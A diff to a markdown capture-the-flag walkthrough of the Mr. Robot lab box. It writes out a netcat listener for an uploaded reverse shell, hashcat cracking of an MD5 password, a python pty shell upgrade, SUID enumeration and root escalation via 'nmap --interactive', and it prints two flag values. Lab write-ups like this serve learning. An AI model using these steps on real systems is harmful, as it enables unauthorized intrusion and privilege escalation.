@@ -117,3 +117,70 @@ After downloading, don't forget to configure the shell a little, then upload it 
 ![screenshot](images/11.png)
 
 ![screenshot](images/12.png)
+
+After the upload is successful, run netcat and navigate the browser to the URL of the file that has been successfully uploaded.
+
+```netcat -lnvp 444
+netcat -lnvp 444
+```
+
+![screenshot](images/13.png)
+
+Awesome! We got the shell up and running on the host! Let’s snoop around to see what we can find!
+
+![screenshot](images/14.png)
+
+Okay, I found the second key, but I don't have permission to view the text, and it looks like we have an MD5 hash of the bot's username. Let's use Hashcat and see if it can crack the MD5 hash for us.
+Copy the hash key and create an .md5 file to use as the hash. You can follow the instructions I used, or use any other command you like.
+
+```echo "c3fcd3d76192e4007dfb496cca67e13b" | tee password.md5
+echo "c3fcd3d76192e4007dfb496cca67e13b" | tee password.md5
+```
+
+```hashcat -a 0 -m 0 password.md5 /usr/share/wordlists/rockyou.txt -o crack.txt
+hashcat -a 0 -m 0 password.md5 /usr/share/wordlists/rockyou.txt -o crack.txt
+```
+![screenshot](images/15.png)
+
+Oh man, that's a terrible password! Who cares, it's easy to crack!
+
+Since we have the password and the session on the host, let's see if we can log in as the robot user.
+
+Okay, we got shell! Now we want to be able to login to robot. So what we need to do is establish a TTY Shell. We can do so by typing the following line:
+
+```python -c 'import pty;pty.spawn("/bin/sh")'
+python -c 'import pty;pty.spawn("/bin/sh")'
+```
+
+Here is a good resource where you can read more about Spawning a TTY Shell.
+Once in, we can login as robot and get the second flag!
+
+![screenshot](images/16.png)
+
+```key 2 :
+822c73956184f694993bede3eb39f959
+```
+Okay, go do a victory lap around the house! You deserve it! Though… we’re still not done. Still got 1 more key to find!
+Since we exploited the host, and got in - our next step is to carry out Post-Explotation and further Enumeration on the internal side.
+
+next thing i usually do is look for SUID binaries and see what we can exploit to get to the top.
+
+```find / -perm -4000 -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+```
+
+![screenshot](images/17.png)
+
+Awesome! The host in running an old version of nmap, which supports an option called “interactive.” With this option, users are able to execute shell commands by using an nmap “shell”.
+
+```nmap --interactive
+nmap --interactive
+```
+```key 3 :
+04787ddef27c3dee1ee161b21670b4e4
+```
+
+## Closing
+And there we have it! We captured all three keys, and rooted the system!
+If this was a real engagement, we would be able to do a lot more damage, now that we have root privileges. Well, I hoped you guys enjoyed this post as much as I enjoyed pwning Mr. Robot!
+This box was really well put together and honestly challenged me - at the same time I learned a lot about the hacking process and some new exploitations, along with many valuable lessons.
